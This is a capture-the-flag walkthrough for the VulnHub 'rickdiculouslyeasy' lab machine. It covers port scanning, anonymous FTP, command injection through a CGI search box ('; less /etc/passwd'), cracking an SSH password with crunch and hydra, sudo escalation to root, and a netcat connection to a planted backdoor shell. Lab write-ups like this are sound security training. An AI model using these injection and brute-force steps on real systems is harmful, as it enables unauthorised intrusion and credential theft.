# rickdiculouslyeasy @VulnHub

Flags: 130 points worth of flags (and get root)

Keywords and tools: nmap, dirb, crunch, hydra netcat, gtfobin

### Run nmap
```
$ nmap -sV -n -v -Pn -p- -T4 -A 192.168.5.12 

PORT      STATE SERVICE    VERSION
21/tcp    open  ftp        vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
|_drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.5.10
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh?
| fingerprint-strings: 
|   NULL: 
|_    Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic x86_64)
80/tcp    open  http       Apache httpd 2.4.27 ((Fedora))
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.27 (Fedora)
|_http-title: Morty's Website
9090/tcp  open  http       Cockpit web service 161 or earlier
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Did not follow redirect to https://192.168.5.12:9090/
13337/tcp open  unknown
| fingerprint-strings: 
|   NULL: 
|_    FLAG:{TheyFoundMyBackDoorMorty}-10Points
22222/tcp open  ssh        OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey: 
|   2048 b4:11:56:7f:c0:36:96:7c:d0:99:dd:53:95:22:97:4f (RSA)
|   256 20:67:ed:d9:39:88:f9:ed:0d:af:8c:8e:8a:45:6e:0e (ECDSA)
|_  256 a6:84:fa:0f:df:e0:dc:e2:9a:2d:e7:13:3c:e7:50:a9 (ED25519)
60000/tcp open  tcpwrapped
```
We have 21,22,80,9090,13337,2222 and 60000 ports open.

### Lets login to FTP
```
─$ ftp 192.168.5.12                      
Connected to 192.168.5.12.
220 (vsFTPd 3.0.3)
Name (192.168.5.12:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
226 Directory send OK.
ftp> get FLAG.txt
local: FLAG.txt remote: FLAG.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for FLAG.txt (42 bytes).
226 Transfer complete.
42 bytes received in 0.00 secs (16.1606 kB/s)
```
First FLAG{Whoa this is unexpected} - 10 Points (total 10/130)

### Dirb
```
---- Scanning URL: http://192.168.5.12/ ----
+ http://192.168.5.12/cgi-bin/ (CODE:403|SIZE:217)
+ http://192.168.5.12/index.html (CODE:200|SIZE:326)
==> DIRECTORY: http://192.168.5.12/passwords/
+ http://192.168.5.12/robots.txt (CODE:200|SIZE:126) 
```

Visit /passwords/FLAG.txt and we have a second flag.
`
FLAG{Yeah d- just don't do it.} - 10 Points (total 20/130)
`

Visit /passwords/passwords.html and view source
`
!--Password: winter--
`

Visit http://192.168.5.12/robots.txt and we can see
```
They're Robots Morty! It's ok to shoot them! They're just Robots!

/cgi-bin/root_shell.cgi
/cgi-bin/tracertool.cgi
/cgi-bin/*
```
Visit http://192.168.5.12/cgi-bin/tracertool.cgi and we have "search box".
```
; ls
; cd / ; ls
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
; less /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-coredump:x:999:998:systemd Core Dumper:/:/sbin/nologin
systemd-timesync:x:998:997:systemd Time Synchronization:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:997:996:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
cockpit-ws:x:996:994:User for cockpit-ws:/:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
chrony:x:995:993::/var/lib/chrony:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash
Morty:x:1001:1001::/home/Morty:/bin/bash
Summer:x:1002:1002::/home/Summer:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
```
We can see some users. Remember the password 'winter' from earlier.

But first lets visit the other web apps.

Visit https://192.168.5.12:9090/ to get another flag.
`
FLAG {There is no Zeus, in your face!} - 10 Points (total 30/130)
`

Visit http://192.168.5.12:13337 to get another flag.
`
FLAG:{TheyFoundMyBackDoorMorty}-10Points (total 40/130)
` 

### Lets try SSH.
```
$ ssh ricksanchez@192.168.5.12 -p 22222
ricksanchez@192.168.5.12's password: 
Permission denied, please try again.
$ ssh morty@192.168.5.12 -p 22222
morty@192.168.5.12's password: 
Permission denied, please try again.
$ ssh Summer@192.168.5.12 -p 22222
Summer@192.168.5.12's password: 
Last login: Wed Aug 23 19:20:29 2017 from 192.168.56.104
[Summer@localhost ~]$ 
```
And we're in.
```
[Summer@localhost ~]$ ls
FLAG.txt
[Summer@localhost ~]$ less FLAG.txt 

FLAG{Get off the high road Summer!} - 10 Points (total 50/130)

[Summer@localhost usr]$ cd /home
[Summer@localhost home]$ ls
Morty  RickSanchez  Summer
[Summer@localhost home]$ cd Morty/
[Summer@localhost Morty]$ ls
journal.txt.zip  Safe_Password.jpg
[Summer@localhost Morty]$ unzip journal.txt.zip 
Archive:  journal.txt.zip
[journal.txt.zip] journal.txt password: [Summer@localhost Morty]$ 
[Summer@localhost Morty]$ head Safe_Password.jpg 
����JFIF``���ExifMM�J(�iZ``��P�8��8 The Safe Password: File: /home/Morty/journal.txt.zip. Password: Meeseek8BIM8BIM%��ُ��	���B~�8P"��

[Summer@localhost Morty]$ unzip -c journal.txt.zip 
Archive:  journal.txt.zip
[journal.txt.zip] journal.txt password: 
  inflating: journal.txt             
Monday: So today Rick told me huge secret. He had finished his flask and was on to commercial grade paint solvent. He spluttered something about a safe, and a password. Or maybe it was a safe password... Was a password that was safe? Or a password to a safe? Or a safe password to a safe?

Anyway. Here it is:

FLAG: {131333} - 20 Points  (total 70/130)
```
Continue to user RickSanche's files.
```
[Summer@localhost Morty]$ cd /home/RickSanchez/
[Summer@localhost RickSanchez]$ ls
RICKS_SAFE  ThisDoesntContainAnyFlags
[Summer@localhost RickSanchez]$ cd RICKS_SAFE/
[Summer@localhost RICKS_SAFE]$ ls
safe
[Summer@localhost RICKS_SAFE]$ ./safe
-bash: ./safe: Permission denied
[Summer@localhost RICKS_SAFE]$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for Summer: 
Sorry, user Summer may not run sudo on localhost.
[Summer@localhost RICKS_SAFE]$ cp safe /home/Summer
[Summer@localhost RICKS_SAFE]$ cd /home/Summer
[Summer@localhost ~]$ ls
FLAG.txt  safe
[Summer@localhost ~]$ ./safe
Past Rick to present Rick, tell future Rick to use GOD DAMN COMMAND LINE AAAAAHHAHAGGGGRRGUMENTS!
[Summer@localhost ~]$ ls
FLAG.txt  safe
[Summer@localhost ~]$ ./safe 131333
decrypt: 	FLAG{And Awwwaaaaayyyy we Go!} - 20 Points (total 90/130)

Ricks password hints:
 (This is incase I forget.. I just hope I don't forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
Follow these clues, in order


1 uppercase character
1 digit
One of the words in my old bands name.�	@
```
From google: Ricks band is "The Flesh Curtains"

### Generate passwordlist and bruteforce with Hydra.
```
$ crunch 7 7 -t ,%Flesh -o /home/kali/Desktop/rick1.txt
$ crunch 10 10 -t ,%Curtains -o /home/kali/Desktop/rick2.txt
$ hydra -l RickSanchez -P /home/kali/Desktop/rick.txt -u -s 22222 192.168.5.12 ssh -f

[22222][ssh] host: 192.168.5.12   login: RickSanchez   password: P7Curtains
```
Login with the found credentials
```
$ ssh RickSanchez@192.168.5.12 -p 22222


Last failed login: Fri Jan 29 19:49:44 AEDT 2021 from 192.168.5.10 on ssh:notty
There were 471 failed login attempts since the last successful login.
Last login: Thu Sep 21 09:45:24 2017
[RickSanchez@localhost ~]$ ls
RICKS_SAFE  ThisDoesntContainAnyFlags
[RickSanchez@localhost ~]$ sudo -l
[sudo] password for RickSanchez: 
Matching Defaults entries for RickSanchez on localhost:
    !visiblepw, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME
    LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User RickSanchez may run the following commands on localhost:
    (ALL) ALL
[RickSanchez@localhost ~]$ find / -user root -perm /4000 2>/dev/null
/usr/bin/passwd
/usr/bin/su
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgidmap
/usr/bin/newgrp
/usr/bin/newuidmap
/usr/bin/mount
/usr/bin/pkexec
/usr/bin/umount
/usr/bin/at
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/crontab
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/sbin/userhelper
/usr/sbin/mount.nfs
/usr/sbin/mtr
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
/usr/libexec/cockpit-session
[RickSanchez@localhost ~]$ sudo su
[root@localhost RickSanchez]# whoami
root
[root@localhost RickSanchez]# cd /root
[root@localhost ~]# ls
anaconda-ks.cfg  FLAG.txt
[root@localhost ~]# less FLAG.txt 

FLAG: {Ionic Defibrillator} - 30 points (total 120/130)

[root@localhost ~]# locate FLAG.txt
/home/Summer/FLAG.txt
/root/FLAG.txt
/var/ftp/FLAG.txt
/var/www/html/passwords/FLAG.txt
```

### The last flag
```
[root@localhost ~]# curl localhost:60000
Welcome to Ricks half baked reverse shell...
[root@localhost ~]# nc localhost:60000
Ncat: Could not resolve hostname "localhost:60000": Name or service not known. QUITTING.
[root@localhost ~]# nc localhost 60000
Welcome to Ricks half baked reverse shell...
# whoami
root 
# locate FLAG.txt
locate FLAG.txt: command not found 
# ls     
FLAG.txt 
# cat FLAG.txt 
FLAG{Flip the pickle Morty!} - 10 Points (total 130/130)
```

